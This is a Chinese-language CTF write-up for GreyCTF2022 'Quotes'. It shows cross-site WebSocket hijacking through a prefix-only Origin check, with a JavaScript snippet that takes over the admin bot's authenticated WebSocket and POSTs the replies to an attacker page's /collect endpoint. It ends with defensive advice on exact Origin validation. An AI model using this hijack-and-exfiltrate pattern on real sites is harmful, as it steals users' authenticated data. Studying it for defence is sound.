# GreyCTF2022 - Quotes

## 题目简述

应用用 WebSocket 返回随机名言；只有带管理员 Cookie 且 `Origin` 以 `http://localhost` 开头的连接才返回 flag。管理员机器人会访问用户提交的 URL，而 `/auth` 仅允许来自 `127.0.0.1` 的请求设置 HttpOnly Cookie。前缀式 Origin 校验造成跨站 WebSocket 劫持。

## 解题过程

准备一个域名以 `localhost` 开头的攻击页面，例如 `http://localhost.attacker.example/`。页面先在 iframe 中加载目标 `/auth`；对机器人而言请求源地址是本机，因此浏览器获得目标站的 `auth` Cookie。随后页面连接目标 WebSocket：

```javascript
const ws = new WebSocket('ws://localhost:7070/quote');
ws.onopen = () => ws.send('getquote');
ws.onmessage = event => {
  fetch('/collect', {method: 'POST', body: event.data});
};
```

服务只执行 `origin.startswith("http://localhost")`，攻击域名也通过；浏览器同时携带刚设置的 Cookie，于是两个条件成立，消息内容为：

```text
grey{qu0735_fr0m_7h3_w153_15_w153_qu0735_7a4c6ec974b6d8b0}
```

## 方法总结

WebSocket 不自动获得传统同源策略的完整保护，服务端必须把 `Origin` 解析为结构化 URL 并精确比对 scheme、host、port。`startswith` 无法区分 `localhost` 与 `localhost.attacker`；HttpOnly 只阻止脚本读取 Cookie，不阻止浏览器随请求发送。
